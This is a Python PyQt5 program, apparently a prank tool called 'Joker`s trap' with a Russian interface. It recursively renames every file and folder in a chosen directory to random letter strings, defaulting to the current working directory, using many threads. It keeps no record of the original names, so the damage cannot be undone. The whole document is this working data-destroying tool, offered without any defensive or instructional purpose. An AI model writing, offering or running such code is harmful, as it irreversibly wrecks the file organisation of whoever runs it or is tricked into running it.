import sys, os
from PyQt5.QtWidgets import QApplication, QWidget, QLineEdit, QFileDialog, QGridLayout, QPushButton
import random
import threading
import time

path = os.getcwd()
class App(QWidget):

    def __init__(self):
        super().__init__()
        self.title = 'Joker`s trap)'
        self.width = 320
        self.height = 140

        self.initUI()

    def initUI(self):
        self.setWindowTitle(self.title)
        self.setFixedWidth(self.width)
        self.setFixedHeight(self.height)

        grid = QGridLayout()
        self.setLayout(grid)

        self.url_line = QLineEdit()
        self.url_line.setReadOnly(True)
        self.url_line.setText("Путь до папки")
        grid.addWidget(self.url_line,0, 0,1,2)

        self.begin_button = QPushButton("Начать")
        grid.addWidget(self.begin_button,1, 0)

        self.choose_folder = QPushButton("Выбрать папку")
        grid.addWidget(self.choose_folder,1, 1)

        self.show()



class Choose():


    def __init__(self, application):
        self.app = application

    def Choose(self):
        global path

        path = QFileDialog.getExistingDirectory(self.app)
        self.app.url_line.setText(path)


class Begin():

    def Begin(self):
        start_event = threading.Event()
        t = threading.Thread(target=self.Renaming,args=(path,start_event))
        t.start()

    def Renaming(self,path_to_dir,ev):
        try:
            dir = [file for file in os.listdir(path_to_dir)]
        except:
            return

        for files in dir:

            file_name = f"{path_to_dir}/{files}"



            if os.path.isdir(file_name):
                new_name = f"{self.Random(random.randint(1,60))}{files[files.rfind('.'):]}"
                new_file = f"{path_to_dir}/{new_name}"
                if threading.active_count() > 15:
                    time.sleep(3)
                try:
                    os.rename(file_name, new_file)
                except:
                    continue

                new_event = threading.Event()
                t = threading.Thread(target=self.Renaming,args=(new_file,new_event))
                t.start()

            else:
                if len(files[files.rfind('.'):]) == len(files):
                    new_name = f"{self.Random(random.randint(1,60))}"
                else:
                    new_name = f"{self.Random(random.randint(1,60))}{files[files.rfind('.'):]}"
                new_file = f"{path_to_dir}/{new_name}"

                try:
                    os.rename(file_name, new_file)
                except:
                    continue

        ev.clear()

    def Random(self,len):

        password = ""

        for _ in range(len):
            if round(random.random()) == 1:
                password += chr(random.randint(65,90))
            else:
                password += chr(random.randint(97,122))

        return password

if __name__ == '__main__':

    app = QApplication(sys.argv)
    ex = App()
    choose = Choose(ex)
    begin = Begin()

    ex.choose_folder.clicked.connect(choose.Choose)
    ex.begin_button.clicked.connect(begin.Begin)

    sys.exit(app.exec_())
